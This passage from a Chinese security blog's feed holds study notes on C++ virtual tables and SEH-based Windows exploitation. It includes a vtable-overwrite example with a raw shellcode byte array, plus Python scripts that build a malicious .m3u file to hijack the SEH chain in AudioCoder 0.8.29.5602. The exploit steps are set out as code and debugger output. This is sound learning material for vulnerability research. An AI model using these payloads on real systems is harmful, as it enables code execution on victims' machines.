&lt;p&gt;C++中的虚函数的作用主要是实现了多态的机制。关于多态，简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”，这是一种泛型技术。所谓泛型技术，说白了就是试图使用不变的代码来实现可变的算法。比如：模板技术，RTTI技术，虚函数技术，要么是试图做到在编译时决议，要么试图做到运行时决议。&lt;br&gt;对C++ 了解的人都应该知道虚函数（Virtual Function）是通过一张虚函数表（Virtual Table）来实现的。简称为V-Table。在这个表中，主是要一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其容真实反应实际的函数。这样，在有虚函数的类的实例中这个表被分配在了这个实例的内存中，所以，当我们用父类的指针来操作一个子类的时候，这张虚函数表就显得由为重要了，它就像一个地图一样，指明了实际所应该调用的函数。&lt;br&gt;C++的编译器应该是保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证取到虚函数表的有最高的性能——如果有多层继承或是多重继承的情况下）。 这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;结合如下代码便可以理解其机制：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;#include &amp;lt;iostream&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;using namespace std;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;class Base &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     public:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            virtual void f() &amp;#123; cout &amp;lt;&amp;lt; &amp;quot;Base::f&amp;quot; &amp;lt;&amp;lt; endl; &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            virtual void g() &amp;#123; cout &amp;lt;&amp;lt; &amp;quot;Base::g&amp;quot; &amp;lt;&amp;lt; endl; &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            virtual void h() &amp;#123; cout &amp;lt;&amp;lt; &amp;quot;Base::h&amp;quot; &amp;lt;&amp;lt; endl; &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;typedef void(*Fun)(void);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int main() &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	Base b;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	Fun pFun = NULL;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	cout &amp;lt;&amp;lt; &amp;quot;虚表指针保存在：&amp;quot; &amp;lt;&amp;lt; (int*)(&amp;amp;b) &amp;lt;&amp;lt; endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	cout &amp;lt;&amp;lt; &amp;quot;虚表指针指向：&amp;quot; &amp;lt;&amp;lt; (int*)*(int*)(&amp;amp;b) &amp;lt;&amp;lt; endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	cout &amp;lt;&amp;lt; &amp;quot;第一个虚函数入口地址：&amp;quot; &amp;lt;&amp;lt; (int *)*((int*)*(int*)(&amp;amp;b)) &amp;lt;&amp;lt; endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	// Invoke the first virtual function &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	pFun = (Fun)*((int*)*(int*)(&amp;amp;b));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	pFun();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;调试如图：&lt;br&gt;&lt;img src=&quot;/images/2015/08/11/cpp-virtual-function-1.png&quot; alt=&quot;图 1&quot;&gt;&lt;br&gt;如果对象实例的内存空间中成员变量发生了溢出，有机会修改对象中的虚表指针或修改虚表中的虚函数指针，那么在程序调用虚函数时就会去执行 shellcode。&lt;br&gt;参考《0day 安全：软件漏洞分析技术》书中的例子：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;#include &amp;quot;windows.h&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#include &amp;quot;iostream.h&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;char shellcode[]=&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x1C\x88\x40\x00&amp;quot;;//set fake virtual function pointer&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;class Failwest&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;public:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	char buf[200];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	virtual void test(void)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		cout&amp;lt;&amp;lt;&amp;quot;Class Vtable::test()&amp;quot;&amp;lt;&amp;lt;endl;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Failwest overflow, *p;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;void main(void)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	char * p_vtable;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	p_vtable=overflow.buf-4;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//__asm int 3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//reset fake virtual table to 0x004088cc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//the address may need to ajusted via runtime debug&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	p_vtable[0]=0xCC;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	p_vtable[1]=0x88;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	p_vtable[2]=0x40;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	p_vtable[3]=0x00;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	strcpy(overflow.buf,shellcode);//set fake virtual function pointer&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	p=&amp;amp;overflow;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	p-&amp;gt;test();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;修改虚表指针指向缓冲区    =&amp;gt; 程序按照伪造的指针去寻找虚表 =&amp;gt; 伪造虚函数指针 =&amp;gt; 程序调用虚函数执行 shellcode&lt;/p&gt;
&lt;h2 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;《0day 安全：软件漏洞分析技术》&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.csdn.net/haoel/article/details/1948051&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;C++ 虚函数表解析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://users.own-hero.net/~decoder/offbyone.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Off-by-one Overflow&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Off-By-One Vulnerability (Stack Based)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Off-by-one-Overflow&quot;&gt;&lt;a href=&quot;#Off-by-one-Overflow&quot; class=&quot;headerlink&quot; title=&quot;Off by one Overflow&quot;&gt;&lt;/a&gt;Off by one Overflow&lt;/h2&gt;&lt;p&gt;与常规的溢出不同，Off by one 只溢出一个字节，刚好可以突破 buffer 边界，大多数情况下并不是严重问题。但如果缓冲区后面跟着 EBP 和返回地址时，溢出的一个字节导致我们『部分』地控制 EBP（EBP 最低位），如果可以让 EBP 落入缓冲区中就可以控制 EIP，进而劫持进程。&lt;br&gt;一字节溢出常出现的场景包括：
    
    </summary>
    
      <category term="Exploit" scheme="http://sh3ll.me/categories/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>S.E.H</title>
    <link href="http://sh3ll.me/2015/08/09/seh/"/>
    <id>http://sh3ll.me/2015/08/09/seh/</id>
    <published>2015-08-09T04:30:41.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;最近学习了《0day 安全 软件漏洞分析技术》中的堆溢出及 S.E.H 章节，记录笔记如下。&lt;/p&gt;
&lt;h2 id=&quot;基础概念&quot;&gt;&lt;a href=&quot;#基础概念&quot; class=&quot;headerlink&quot; title=&quot;基础概念&quot;&gt;&lt;/a&gt;基础概念&lt;/h2&gt;&lt;p&gt;S.E.H 即异常处理结构体（Structure Exception Handler），它是 Windows 异常处理机制所采用的重要数据结构。每个 S.E.H 包含两个 DWORD 指针：S.E.H 链表指针和异常处理函数句柄，共 8 个字节，如图：&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/images/2015/08/09/seh-1.png&quot; alt=&quot;图 1&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;S.E.H 按照级别可分为：线程的异常处理、进程的异常处理、系统默认的异常处理（U.E.F），其整体的处理流程为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CPU 执行时发生未捕获异常，内核结果进程的控制权，开始内核态的异常处理。&lt;/li&gt;
&lt;li&gt;内核异常结束，将控制权还给 ring3.&lt;/li&gt;
&lt;li&gt;ring3 中第一个处理异常的函数是 ntdll.dll 中的 KiUserExceptionDispatcher() 函数。&lt;/li&gt;
&lt;li&gt;KiUserExceptionDispatcher() 首先检查程序是否处于调试状态。如果程序正在被调试，会将异常交给调试器进行处理。&lt;/li&gt;
&lt;li&gt;在非调试状态下，KiUserExceptionDispatcher() 调用 RtlDispatchException() 函数对线程的 S.E.H 链表进行遍历，如果找到能够处理异常的回调函数，将再次遍历先前调用过的 S.E.H 句柄，即 unwind 操作，以保证异常处理机制自身的完整性。&lt;/li&gt;
&lt;li&gt;如果栈中所有的 S.E.H 都失败了，且用户曾经使用过 SetUnhandledExceptionFilter() 函数设定进程处理异常，则这个异常处理将被调用。&lt;/li&gt;
&lt;li&gt;如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么系统默认的异常处理 UnhandledExceptionFilter() 将会被调用。U.E.F 会根据注册表中相关信息决定是默默地关闭程序，还是弹出错误对话框。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;测试目标及测试环境&quot;&gt;&lt;a href=&quot;#测试目标及测试环境&quot; class=&quot;headerlink&quot; title=&quot;测试目标及测试环境&quot;&gt;&lt;/a&gt;测试目标及测试环境&lt;/h2&gt;&lt;p&gt;参考&lt;a href=&quot;http://x0day.me/index.php/archives/seh-based-exploit.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;小马哥的文章&lt;/a&gt;，我也采用 AudioCoder 作为测试软件。&lt;br&gt;测试目标：AudioCoder 0.8.29.5602&lt;br&gt;测试环境：Windows XP SP3 + Immunity Debugger&lt;/p&gt;
&lt;h2 id=&quot;计算溢出长度&quot;&gt;&lt;a href=&quot;#计算溢出长度&quot; class=&quot;headerlink&quot; title=&quot;计算溢出长度&quot;&gt;&lt;/a&gt;计算溢出长度&lt;/h2&gt;&lt;p&gt;通过 &lt;code&gt;!mona pc 4096&lt;/code&gt; 生成测试字符串，编写如下脚本生成 poc 文件：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;buf = &amp;quot;http://&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5...&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;poc_file = open(&amp;quot;poc.m3u&amp;quot;, &amp;quot;wb&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;poc_file.write(buf)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;poc_file.close()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;将生成的 poc.m3u 加载到 AudioCoder 中，通过 &lt;code&gt;!mona findmsp&lt;/code&gt; 观察到 nseh 已被覆盖：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;...snip...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[+] Examining SEH chain&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    SEH record (nseh field) at 0x0012e6f4 overwritten with normal pattern : 0x7a41327a (offset 757), followed by 3331 bytes of cyclic data after the handler&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;...snip...&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;溢出长度为 757。&lt;br&gt;验证一下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;buf = &amp;quot;http://&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;A&amp;quot; * 757&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;B&amp;quot; * 4 		#nseh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;C&amp;quot; * 4 		#seh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;poc_file = open(&amp;quot;poc.m3u&amp;quot;, &amp;quot;wb&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;poc_file.write(buf)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;poc_file.close()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;重新加载 poc，debugger 中可以看到 nseh 和 seh 已被覆盖：&lt;br&gt;&lt;img src=&quot;/images/2015/08/09/seh-2.png&quot; alt=&quot;图 2&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;构造溢出字符串&quot;&gt;&lt;a href=&quot;#构造溢出字符串&quot; class=&quot;headerlink&quot; title=&quot;构造溢出字符串&quot;&gt;&lt;/a&gt;构造溢出字符串&lt;/h2&gt;&lt;p&gt;利用跳转技术，通常将 S.E.H 溢出的 buf 构造为如下格式：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;buf + jmp 06 + ppr + nops + shellcode&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;也就是说将 nseh 覆盖为 &lt;code&gt;jmp 06&lt;/code&gt;，seh 覆盖为 &lt;code&gt;pop; pop; ret&lt;/code&gt;。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;!mona asm -s jmp 06     =&amp;gt;		\xeb\x06&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;!mona seh               =&amp;gt; 		0x66012e63&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;生成 poc 文件：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;buf = &amp;quot;http://&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;A&amp;quot; * 757&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\xeb\x06\x90\x90&amp;quot; 		#nseh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x63\x2e\x01\x66&amp;quot; 		#seh&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x90&amp;quot; * 20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;poc_file = open(&amp;quot;poc.m3u&amp;quot;, &amp;quot;wb&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;poc_file.write(buf)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;poc_file.close()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;0x66012e63&lt;/code&gt; 处断点后，调试发现最终成功跳至 shellcode 处执行代码：&lt;br&gt;&lt;img src=&quot;/images/2015/08/09/seh-3.png&quot; alt=&quot;图 3&quot;&gt;&lt;/p&gt;
